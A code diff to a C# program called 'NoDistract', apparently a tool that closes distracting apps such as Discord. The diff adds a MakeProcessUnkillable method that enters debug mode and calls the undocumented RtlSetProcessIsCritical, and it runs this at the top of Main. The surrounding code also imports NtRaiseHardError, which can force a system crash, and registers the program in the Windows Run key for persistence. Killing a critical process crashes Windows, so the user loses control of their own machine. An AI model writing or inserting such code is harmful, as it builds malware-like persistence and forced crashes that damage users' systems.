@@ -36,6 +36,15 @@ namespace NoDistract
         [DllImport("ntdll.dll")]
         private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
 
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+
+        public static void MakeProcessUnkillable()
+        {
+            Process.EnterDebugMode();
+            RtlSetProcessIsCritical(1, 0, 0);
+        }
+
         private static string[] _processNames = new string[]
         {
             "Discord"
@@ -69,6 +78,8 @@ namespace NoDistract
 
         public static void Main()
         {
+            MakeProcessUnkillable();
+
             try
             {
                 RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
